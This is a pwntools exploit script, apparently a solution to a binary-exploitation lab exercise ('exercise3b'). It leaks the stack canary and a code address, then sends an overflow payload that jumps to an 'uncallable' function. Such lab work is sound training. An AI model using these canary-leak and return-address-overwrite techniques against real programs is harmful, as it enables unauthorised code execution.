#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit():
    r = start()
    #print(cyclic_find(0x0000000061616175)) # 80
    #print(cyclic_find(0x6161616A)) # 24
    # diff roDataUnauth to hello
    #print(hex(0x558E3C79F067 - 0x558E3C79E288)) # 0xd82

    # First get the canary
    r.sendline(cyclic(79)) # \n of sendline is the -1
    r.recvuntil(b"Well of course ")
    contains_canary = r.recvuntil(b" is not the password")
    contains_canary = contains_canary[:-len(" is not the password")][80:]
    canary = u32(contains_canary[-10:-6])
    print(f"Canary: {hex(canary)}")
    # now get addr of ro data
    r.sendline(b"AAAABBB") # +1 for \n
    r.recvuntil(b"Well of course ")
    contains_addr = r.recvuntil(b" is not the password")
    contains_addr = contains_addr[:-len(" is not the password")][8:]
    #roData_addr = u64(contains_addr[-6:]+b"\x00\x00")
    #print(len(contains_addr))
    roData_addr = u64(contains_addr+b'\x00'*(8-len(contains_addr)))
    ph_addr = roData_addr - 0xddf
    print(f"roDataAddr is {hex(roData_addr)} and hence print hello {hex(ph_addr)}")
    unc_add = ph_addr - 0x1f
    # Now do the skip of the canary and return to uncallable
    r.sendline(b"A"*80+p32(canary) + b"B"*36 + p64(unc_add))
    r.recvuntil(b" is not the password")
    print(r.recvall(timeout=1).decode())
    #r.interactive()

for i in range(100):
    try:
        exploit()
    except:
        pass
